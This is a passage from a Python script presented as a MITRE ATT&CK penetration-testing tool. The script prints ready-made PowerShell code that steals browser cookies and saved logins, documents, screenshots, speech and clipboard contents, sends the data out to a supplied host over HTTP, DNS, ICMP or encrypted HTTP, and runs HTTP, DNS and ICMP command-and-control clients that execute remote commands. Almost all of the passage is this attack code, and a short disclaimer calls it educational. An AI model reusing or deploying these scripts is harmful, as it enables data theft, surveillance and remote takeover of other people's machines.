            $files = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue -Include "*$ext"
            foreach ($file in $files) {
                # Skip files larger than 10MB
                if ($file.Length -gt 10MB) { continue }
                
                $destPath = Join-Path $OutputPath "$($file.Directory.Name)_$($file.Name)"
                try {
                    Copy-Item -Path $file.FullName -Destination $destPath -ErrorAction SilentlyContinue
                    Write-Host "Collected: $($file.FullName)" -ForegroundColor Green
                } catch {
                    Write-Host "Failed to collect: $($file.FullName)" -ForegroundColor Red
                }
            }
        }
    }
    
    # Compress the output directory
    $zipPath = "$OutputPath.zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($OutputPath, $zipPath)
    
    Write-Host "Collection complete. Files stored in: $zipPath" -ForegroundColor Green
    return $zipPath
}

function Get-BrowserData {
    param (
        [string]$OutputPath = "$env:TEMP\\browser_data"
    )
    
    # Create output directory if it doesn't exist
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath | Out-Null
    }
    
    # Browser data paths
    $browserPaths = @{
        "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default";
        "Firefox" = "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\";
        "Edge" = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"
    }
    
    # Files to collect
    $filesToCollect = @(
        "History",
        "Bookmarks",
        "Cookies",
        "Login Data",
        "Web Data"
    )
    
    foreach ($browser in $browserPaths.Keys) {
        $browserPath = $browserPaths[$browser]
        if (Test-Path $browserPath) {
            $browserOutputPath = Join-Path $OutputPath $browser
            New-Item -ItemType Directory -Path $browserOutputPath -ErrorAction SilentlyContinue | Out-Null
            
            foreach ($file in $filesToCollect) {
                $filePath = Join-Path $browserPath $file
                if (Test-Path $filePath) {
                    $destPath = Join-Path $browserOutputPath $file
                    try {
                        Copy-Item -Path $filePath -Destination $destPath -ErrorAction SilentlyContinue
                        Write-Host "Collected $browser $file" -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to collect $browser $file" -ForegroundColor Red
                    }
                }
            }
        }
    }
    
    # Compress the output directory
    $zipPath = "$OutputPath.zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($OutputPath, $zipPath)
    
    Write-Host "Browser data collection complete. Files stored in: $zipPath" -ForegroundColor Green
    return $zipPath
}

function Get-ScreenCapture {
    param (
        [string]$OutputPath = "$env:TEMP\\screenshots",
        [int]$Interval = 10,
        [int]$Duration = 60
    )
    
    # Create output directory if it doesn't exist
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath | Out-Null
    }
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $startTime = Get-Date
    $endTime = $startTime.AddSeconds($Duration)
    
    while ((Get-Date) -lt $endTime) {
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $screenshotPath = Join-Path $OutputPath "screenshot_$timestamp.png"
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        
        $bitmap.Save($screenshotPath)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Write-Host "Screenshot saved: $screenshotPath" -ForegroundColor Green
        Start-Sleep -Seconds $Interval
    }
    
    # Compress the output directory
    $zipPath = "$OutputPath.zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($OutputPath, $zipPath)
    
    Write-Host "Screen capture complete. Files stored in: $zipPath" -ForegroundColor Green
    return $zipPath
}

# Example usage
# Get-InterestingFiles -Paths @("C:\\Users\\Administrator\\Documents", "C:\\Users\\Administrator\\Desktop")
# Get-BrowserData
# Get-ScreenCapture -Interval 5 -Duration 30
        """
        print(Fore.GREEN + ps_collection + Style.RESET_ALL)
        
        # Audio capture example
        print(Fore.YELLOW + "\n[+] Audio Capture Example:" + Style.RESET_ALL)
        audio_capture = """
# PowerShell audio capture script (simplified example)
Add-Type -AssemblyName System.Speech
$recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$grammar = New-Object System.Speech.Recognition.DictationGrammar
$recognizer.LoadGrammar($grammar)
$recognizer.SetInputToDefaultAudioDevice()

$outputPath = "$env:TEMP\\audio_capture.txt"
"Audio Capture Started: $(Get-Date)" | Out-File -FilePath $outputPath

$recognizer.RecognizeAsync([System.Speech.Recognition.RecognizeMode]::Multiple)
$recognizer.SpeechRecognized += {
    param($sender, $e)
    $text = $e.Result.Text
    "$(Get-Date): $text" | Out-File -FilePath $outputPath -Append
}

Start-Sleep -Seconds 60  # Capture for 60 seconds
$recognizer.RecognizeAsyncStop()
        """
        print(Fore.GREEN + audio_capture + Style.RESET_ALL)
        
        # Clipboard capture example
        print(Fore.YELLOW + "\n[+] Clipboard Capture Example:" + Style.RESET_ALL)
        clipboard_capture = """
# PowerShell clipboard capture script
function Monitor-Clipboard {
    param (
        [int]$Duration = 60,
        [string]$OutputPath = "$env:TEMP\\clipboard_data.txt"
    )
    
    Add-Type -AssemblyName System.Windows.Forms
    
    "Clipboard Monitoring Started: $(Get-Date)" | Out-File -FilePath $OutputPath
    
    $startTime = Get-Date
    $endTime = $startTime.AddSeconds($Duration)
    $lastClipboard = ""
    
    while ((Get-Date) -lt $endTime) {
        $currentClipboard = [System.Windows.Forms.Clipboard]::GetText()
        
        if ($currentClipboard -and $currentClipboard -ne $lastClipboard) {
            "$(Get-Date): $currentClipboard" | Out-File -FilePath $OutputPath -Append
            $lastClipboard = $currentClipboard
        }
        
        Start-Sleep -Seconds 1
    }
    
    "Clipboard Monitoring Ended: $(Get-Date)" | Out-File -FilePath $OutputPath -Append
    Write-Host "Clipboard monitoring complete. Data stored in: $OutputPath" -ForegroundColor Green
}

# Example usage
# Monitor-Clipboard -Duration 120
        """
        print(Fore.GREEN + clipboard_capture + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during collection simulation: {e}" + Style.RESET_ALL)

# 10. Exfiltration
def exfiltration(target, port):
    print(Fore.GREEN + f"[*] Simulating Exfiltration techniques for {target}:{port}" + Style.RESET_ALL)
    
    try:
        # Data exfiltration examples
        print(Fore.YELLOW + "\n[+] Data Exfiltration Examples:" + Style.RESET_ALL)
        
        # HTTP exfiltration
        print(Fore.YELLOW + "\n[+] HTTP Exfiltration:" + Style.RESET_ALL)
        http_exfil = """
# PowerShell HTTP exfiltration script
function Send-DataHTTP {
    param (
        [string]$FilePath,
        [string]$Url = "http://{0}:{1}/upload.php"
    )
    
    if (-not (Test-Path $FilePath)) {
        Write-Host "File not found: $FilePath" -ForegroundColor Red
        return
    }
    
    # Read and encode file
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
    
    # Prepare data
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $fileName = Split-Path $FilePath -Leaf
    
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream$LF",
        $fileEnc,
        "--$boundary--$LF"
    ) -join $LF
    
    # Send data
    try {
        $response = Invoke-RestMethod -Uri $Url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
        Write-Host "File exfiltrated successfully: $FilePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to exfiltrate file: $_" -ForegroundColor Red
    }
}

# Example usage
# Send-DataHTTP -FilePath "$env:TEMP\\collected_files.zip" -Url "http://{0}:{1}/upload.php"
        """.format(target, port)
        print(Fore.GREEN + http_exfil + Style.RESET_ALL)
        
        # DNS exfiltration
        print(Fore.YELLOW + "\n[+] DNS Exfiltration:" + Style.RESET_ALL)
        dns_exfil = """
# PowerShell DNS exfiltration script (simplified example)
function Send-DataDNS {
    param (
        [string]$FilePath,
        [string]$DomainName = "{0}.com",
        [int]$ChunkSize = 30
    )
    
    if (-not (Test-Path $FilePath)) {
        Write-Host "File not found: $FilePath" -ForegroundColor Red
        return
    }
    
    # Read and encode file
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
    
    # Split data into chunks
    $chunks = [System.Collections.ArrayList]::new()
    for ($i = 0; $i -lt $fileEnc.Length; $i += $ChunkSize) {
        $end = [Math]::Min($i + $ChunkSize, $fileEnc.Length)
        $chunk = $fileEnc.Substring($i, $end - $i)
        $chunks.Add($chunk) | Out-Null
    }
    
    # Send chunks via DNS queries
    $totalChunks = $chunks.Count
    for ($i = 0; $i -lt $totalChunks; $i++) {
        $chunkId = $i.ToString("000")
        $query = "$chunkId.$($chunks[$i]).$DomainName"
        
        try {
            $null = Resolve-DnsName -Name $query -Type A -ErrorAction SilentlyContinue
            Write-Host "Sent chunk $($i+1)/$totalChunks" -ForegroundColor Green
            Start-Sleep -Milliseconds 100
        } catch {
            Write-Host "Failed to send chunk $($i+1): $_" -ForegroundColor Red
        }
    }
    
    # Send completion signal
    $null = Resolve-DnsName -Name "DONE.$totalChunks.$DomainName" -Type A -ErrorAction SilentlyContinue
    Write-Host "File exfiltration complete: $FilePath" -ForegroundColor Green
}

# Example usage
# Send-DataDNS -FilePath "$env:TEMP\\collected_files.zip" -DomainName "exfil.{0}.com"
        """.format(target)
        print(Fore.GREEN + dns_exfil + Style.RESET_ALL)
        
        # ICMP exfiltration
        print(Fore.YELLOW + "\n[+] ICMP Exfiltration:" + Style.RESET_ALL)
        icmp_exfil = """
# PowerShell ICMP exfiltration script (simplified example)
function Send-DataICMP {
    param (
        [string]$FilePath,
        [string]$TargetIP = "{0}",
        [int]$ChunkSize = 16
    )
    
    if (-not (Test-Path $FilePath)) {
        Write-Host "File not found: $FilePath" -ForegroundColor Red
        return
    }
    
    # Read and encode file
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
    
    # Split data into chunks
    $chunks = [System.Collections.ArrayList]::new()
    for ($i = 0; $i -lt $fileEnc.Length; $i += $ChunkSize) {
        $end = [Math]::Min($i + $ChunkSize, $fileEnc.Length)
        $chunk = $fileEnc.Substring($i, $end - $i)
        $chunks.Add($chunk) | Out-Null
    }
    
    # Send chunks via ICMP
    $totalChunks = $chunks.Count
    for ($i = 0; $i -lt $totalChunks; $i++) {
        $chunkId = $i.ToString("000")
        $data = "$chunkId:$($chunks[$i])"
        
        try {
            $ping = New-Object System.Net.NetworkInformation.Ping
            $options = New-Object System.Net.NetworkInformation.PingOptions
            $options.DontFragment = $true
            
            $buffer = [System.Text.Encoding]::ASCII.GetBytes($data)
            $ping.Send($TargetIP, 1000, $buffer, $options) | Out-Null
            
            Write-Host "Sent chunk $($i+1)/$totalChunks" -ForegroundColor Green
            Start-Sleep -Milliseconds 100
        } catch {
            Write-Host "Failed to send chunk $($i+1): $_" -ForegroundColor Red
        }
    }
    
    # Send completion signal
    $buffer = [System.Text.Encoding]::ASCII.GetBytes("DONE:$totalChunks")
    $ping = New-Object System.Net.NetworkInformation.Ping
    $ping.Send($TargetIP, 1000, $buffer, $options) | Out-Null
    
    Write-Host "File exfiltration complete: $FilePath" -ForegroundColor Green
}

# Example usage
# Send-DataICMP -FilePath "$env:TEMP\\collected_files.zip" -TargetIP "{0}"
        """.format(target)
        print(Fore.GREEN + icmp_exfil + Style.RESET_ALL)
        
        # Encrypted exfiltration
        print(Fore.YELLOW + "\n[+] Encrypted Exfiltration:" + Style.RESET_ALL)
        encrypted_exfil = """
# PowerShell encrypted exfiltration script
function Send-EncryptedData {
    param (
        [string]$FilePath,
        [string]$Url = "http://{0}:{1}/upload.php",
        [string]$Key = "Th1sIsASecr3tK3y!"
    )
    
    if (-not (Test-Path $FilePath)) {
        Write-Host "File not found: $FilePath" -ForegroundColor Red
        return
    }
    
    # Read file
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    
    # Encrypt data
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $iv = New-Object byte[] 16
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($iv)
    
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $keyBytes
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
    
    # Combine IV and encrypted data
    $encryptedBytes = $iv + $encryptedData
    $encryptedBase64 = [System.Convert]::ToBase64String($encryptedBytes)
    
    # Send data
    try {
        $body = @{
            data = $encryptedBase64
            filename = Split-Path $FilePath -Leaf
        }
        
        $response = Invoke-RestMethod -Uri $Url -Method Post -Body $body
        Write-Host "Encrypted file exfiltrated successfully: $FilePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to exfiltrate encrypted file: $_" -ForegroundColor Red
    }
}

# Example usage
# Send-EncryptedData -FilePath "$env:TEMP\\collected_files.zip" -Url "http://{0}:{1}/upload.php"
        """.format(target, port)
        print(Fore.GREEN + encrypted_exfil + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during exfiltration simulation: {e}" + Style.RESET_ALL)

# 11. Command and Control
def command_and_control(target, port):
    print(Fore.GREEN + f"[*] Simulating Command and Control techniques for {target}:{port}" + Style.RESET_ALL)
    
    try:
        # C2 frameworks examples
        print(Fore.YELLOW + "\n[+] Command and Control Frameworks:" + Style.RESET_ALL)
        c2_frameworks = [
            {"name": "Metasploit", "description": "Comprehensive exploitation framework with C2 capabilities"},
            {"name": "Covenant", "description": ".NET based C2 framework"},
            {"name": "Empire", "description": "PowerShell post-exploitation framework"},
            {"name": "Cobalt Strike", "description": "Commercial adversary simulation and red team operations platform"},
            {"name": "Sliver", "description": "Cross-platform adversary emulation/red team framework"}
        ]
        
        for framework in c2_frameworks:
            print(Fore.GREEN + f"    {framework['name']}: {framework['description']}" + Style.RESET_ALL)
        
        # Custom C2 implementation examples
        print(Fore.YELLOW + "\n[+] Custom C2 Implementation Examples:" + Style.RESET_ALL)
        
        # HTTP C2 client
        print(Fore.YELLOW + "\n[+] HTTP C2 Client:" + Style.RESET_ALL)
        http_c2_client = """
# PowerShell HTTP C2 client (simplified example)
function Start-C2Client {
    param (
        [string]$C2Server = "http://{0}:{1}/c2",
        [int]$SleepTime = 5
    )
    
    $clientId = [Guid]::NewGuid().ToString()
    $hostname = [System.Net.Dns]::GetHostName()
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    
    # Register with C2 server
    $registerData = @{{
        "id" = $clientId
        "hostname" = $hostname
        "username" = $username
        "os" = [System.Environment]::OSVersion.ToString()
        "arch" = if ([System.Environment]::Is64BitOperatingSystem) {{ "x64" }} else {{ "x86" }}
        "pid" = [System.Diagnostics.Process]::GetCurrentProcess().Id
        "privilege" = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) { "Admin" } else { "User" }
    }
    
    try {
        $response = Invoke-RestMethod -Uri "$C2Server/register" -Method Post -Body ($registerData | ConvertTo-Json) -ContentType "application/json"
        Write-Host "Registered with C2 server. Client ID: $clientId" -ForegroundColor Green
    } catch {
        Write-Host "Failed to register with C2 server: $_" -ForegroundColor Red
        return
    }
    
    # Main C2 loop
    while ($true) {
        try {
            # Check for commands
            $response = Invoke-RestMethod -Uri "$C2Server/tasks?id=$clientId" -Method Get
            
            if ($response.tasks -and $response.tasks.Count -gt 0) {
                foreach ($task in $response.tasks) {
                    Write-Host "Received task: $($task.command)" -ForegroundColor Yellow
                    
                    # Execute command
                    $result = $null
                    try {
                        if ($task.type -eq "powershell") {
                            $result = Invoke-Expression -Command $task.command | Out-String
                        } elseif ($task.type -eq "cmd") {
                            $result = cmd.exe /c $task.command 2>&1 | Out-String
                        } else {
                            $result = "Unknown task type: $($task.type)"
                        }
                    } catch {
                        $result = "Error executing command: $_"
                    }
                    
                    # Send result back to C2
                    $resultData = @{
                        "id" = $clientId
                        "task_id" = $task.id
                        "result" = $result
                    }
                    
                    Invoke-RestMethod -Uri "$C2Server/results" -Method Post -Body ($resultData | ConvertTo-Json) -ContentType "application/json" | Out-Null
                    Write-Host "Result sent to C2 server" -ForegroundColor Green
                }
            }
            
            # Sleep before next check
            Start-Sleep -Seconds $SleepTime
            
        } catch {
            Write-Host "Error communicating with C2 server: $_" -ForegroundColor Red
            Start-Sleep -Seconds ($SleepTime * 2)
        }
    }
}

# Example usage
# Start-C2Client -C2Server "http://{0}:{1}/c2" -SleepTime 10
        """.format(target, port)
        print(Fore.GREEN + http_c2_client + Style.RESET_ALL)
        
        # DNS C2 client
        print(Fore.YELLOW + "\n[+] DNS C2 Client:" + Style.RESET_ALL)
        dns_c2_client = """
# PowerShell DNS C2 client (simplified example)
function Start-DNSC2Client {
    param (
        [string]$C2Domain = "{0}.com",
        [int]$SleepTime = 30
    )
    
    $clientId = [Guid]::NewGuid().ToString().Substring(0, 8)
    $hostname = [System.Net.Dns]::GetHostName()
    
    # Register with C2 server
    $null = Resolve-DnsName -Name "register.$clientId.$hostname.$C2Domain" -Type A -ErrorAction SilentlyContinue
    Write-Host "Registered with DNS C2 server. Client ID: $clientId" -ForegroundColor Green
    
    # Main C2 loop
    while ($true) {
        try {
            # Check for commands
            $dnsResponse = Resolve-DnsName -Name "tasks.$clientId.$C2Domain" -Type TXT -ErrorAction SilentlyContinue
            
            if ($dnsResponse -and $dnsResponse.Strings) {
                $task = $dnsResponse.Strings[0]
                
                if ($task -ne "NONE") {
                    Write-Host "Received task: $task" -ForegroundColor Yellow
                    
                    # Decode command if needed (base64)
                    $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task))
                    
                    # Execute command
                    $result = $null
                    try {
                        $result = Invoke-Expression -Command $decodedCommand | Out-String
                    } catch {
                        $result = "Error executing command: $_"
                    }
                    
                    # Encode result
                    $encodedResult = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result))
                    
                    # Split result into chunks (DNS has length limitations)
                    $chunks = [System.Collections.ArrayList]::new()
                    $chunkSize = 30
                    for ($i = 0; $i -lt $encodedResult.Length; $i += $chunkSize) {
                        $end = [Math]::Min($i + $chunkSize, $encodedResult.Length)
                        $chunk = $encodedResult.Substring($i, $end - $i)
                        $chunks.Add($chunk) | Out-Null
                    }
                    
                    # Send result chunks back to C2
                    for ($i = 0; $i -lt $chunks.Count; $i++) {
                        $chunkId = $i.ToString("000")
                        $null = Resolve-DnsName -Name "result.$clientId.$chunkId.$($chunks[$i]).$C2Domain" -Type A -ErrorAction SilentlyContinue
                        Start-Sleep -Milliseconds 100
                    }
                    
                    # Send completion signal
                    $null = Resolve-DnsName -Name "result.$clientId.done.$($chunks.Count).$C2Domain" -Type A -ErrorAction SilentlyContinue
                    Write-Host "Result sent to DNS C2 server" -ForegroundColor Green
                }
            }
            
            # Sleep before next check
            Start-Sleep -Seconds $SleepTime
            
        } catch {
            Write-Host "Error communicating with DNS C2 server: $_" -ForegroundColor Red
            Start-Sleep -Seconds ($SleepTime * 2)
        }
    }
}

# Example usage
# Start-DNSC2Client -C2Domain "c2.{0}.com" -SleepTime 60
        """.format(target)
        print(Fore.GREEN + dns_c2_client + Style.RESET_ALL)
        
        # ICMP C2 client
        print(Fore.YELLOW + "\n[+] ICMP C2 Client:" + Style.RESET_ALL)
        icmp_c2_client = """
# PowerShell ICMP C2 client (simplified example)
function Start-ICMPC2Client {
    param (
        [string]$C2Server = "{0}",
        [int]$SleepTime = 60
    )
    
    $clientId = [Guid]::NewGuid().ToString().Substring(0, 8)
    
    # Register with C2 server
    $registerData = "REGISTER:$clientId"
    $buffer = [System.Text.Encoding]::ASCII.GetBytes($registerData)
    
    $ping = New-Object System.Net.NetworkInformation.Ping
    $options = New-Object System.Net.NetworkInformation.PingOptions
    $options.DontFragment = $true
    
    try {
        $ping.Send($C2Server, 1000, $buffer, $options) | Out-Null
        Write-Host "Registered with ICMP C2 server. Client ID: $clientId" -ForegroundColor Green
    } catch {
        Write-Host "Failed to register with ICMP C2 server: $_" -ForegroundColor Red
        return
    }
    
    # Main C2 loop
    while ($true) {
        try {
            # Check for commands
            $checkData = "CHECK:$clientId"
            $buffer = [System.Text.Encoding]::ASCII.GetBytes($checkData)
            
            $response = $ping.Send($C2Server, 1000, $buffer, $options)
            
            if ($response.Status -eq 'Success' -and $response.Buffer.Length -gt 0) {
                $responseText = [System.Text.Encoding]::ASCII.GetString($response.Buffer)
                
                if ($responseText -match "^CMD:(.+)$") {
                    $command = $matches[1]
                    Write-Host "Received command: $command" -ForegroundColor Yellow
                    
                    # Execute command
                    $result = $null
                    try {
                        $result = Invoke-Expression -Command $command | Out-String
                    } catch {
                        $result = "Error executing command: $_"
                    }
                    
                    # Send result back to C2 (in chunks due to ICMP size limitations)
                    $chunks = [System.Collections.ArrayList]::new()
                    $chunkSize = 16
                    $encodedResult = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result))
                    
                    for ($i = 0; $i -lt $encodedResult.Length; $i += $chunkSize) {
                        $end = [Math]::Min($i + $chunkSize, $encodedResult.Length)
                        $chunk = $encodedResult.Substring($i, $end - $i)
                        $chunks.Add($chunk) | Out-Null
                    }
                    
                    # Send chunks
                    for ($i = 0; $i -lt $chunks.Count; $i++) {
                        $chunkData = "RESULT:$clientId:$i:$($chunks[$i])"
                        $buffer = [System.Text.Encoding]::ASCII.GetBytes($chunkData)
                        $ping.Send($C2Server, 1000, $buffer, $options) | Out-Null
                        Start-Sleep -Milliseconds 100
                    }
                    
                    # Send completion signal
                    $doneData = "DONE:$clientId:$($chunks.Count)"
                    $buffer = [System.Text.Encoding]::ASCII.GetBytes($doneData)
                    $ping.Send($C2Server, 1000, $buffer, $options) | Out-Null
                    
                    Write-Host "Result sent to ICMP C2 server" -ForegroundColor Green
                }
            }
            
            # Sleep before next check
            Start-Sleep -Seconds $SleepTime
            
        } catch {
            Write-Host "Error communicating with ICMP C2 server: $_" -ForegroundColor Red
            Start-Sleep -Seconds ($SleepTime * 2)
        }
    }
}

# Example usage
# Start-ICMPC2Client -C2Server "{0}" -SleepTime 30
        """.format(target)
        print(Fore.GREEN + icmp_c2_client + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + f"[!] Error during command and control simulation: {e}" + Style.RESET_ALL)

# Main function
def main():
    banner = """
    ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
    ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║          ██║   ██║   ██║██║   ██║██║     
    ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║          ██║   ██║   ██║██║   ██║██║     
    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                                        
    Advanced Penetration Testing Tool - MITRE ATT&CK Framework
    """
    
    print(Fore.RED + banner + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] Disclaimer: This tool is for educational purposes only. Use responsibly and only on systems you have permission to test." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] The tool simulates penetration testing techniques but does not actually perform any attacks.\n" + Style.RESET_ALL)
    
    parser = argparse.ArgumentParser(description="Advanced Penetration Testing Tool - MITRE ATT&CK Framework")
    parser.add_argument("--target", help="Target IP address or hostname", default="127.0.0.1")
    parser.add_argument("--port", help="Target port", type=int, default=8080)
    parser.add_argument("--all", help="Run all modules", action="store_true")
    parser.add_argument("--recon", help="Run reconnaissance module", action="store_true")
    parser.add_argument("--execution", help="Run execution module", action="store_true")
    parser.add_argument("--persistence", help="Run persistence module", action="store_true")
    parser.add_argument("--privilege", help="Run privilege escalation module", action="store_true")
    parser.add_argument("--defense", help="Run defense evasion module", action="store_true")
    parser.add_argument("--credential", help="Run credential access module", action="store_true")
    parser.add_argument("--discovery", help="Run discovery module", action="store_true")
    parser.add_argument("--lateral", help="Run lateral movement module", action="store_true")
    parser.add_argument("--collection", help="Run collection module", action="store_true")
    parser.add_argument("--exfiltration", help="Run exfiltration module", action="store_true")
    parser.add_argument("--c2", help="Run command and control module", action="store_true")
    
    args = parser.parse_args()
    
    if not any(vars(args).values()):
        parser.print_help()
        return
    
    target = args.target
    port = args.port
    
    if args.all or args.recon:
        reconnaissance(target, port)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.execution:
        execution(target, port)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.persistence:
        persistence(target)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.privilege:
        privilege_escalation(target)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.defense:
        defense_evasion()
        print("\n" + "="*80 + "\n")
    
    if args.all or args.credential:
        credential_access()
        print("\n" + "="*80 + "\n")
    
    if args.all or args.discovery:
        discovery(target)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.lateral:
        lateral_movement(target)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.collection:
        collection(target)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.exfiltration:
        exfiltration(target, port)
        print("\n" + "="*80 + "\n")
    
    if args.all or args.c2:
        command_and_control(target, port)
        print("\n" + "="*80 + "\n")
    
    print(Fore.GREEN + "[*] Penetration testing simulation completed." + Style.RESET_ALL)

if __name__ == "__main__":
    main()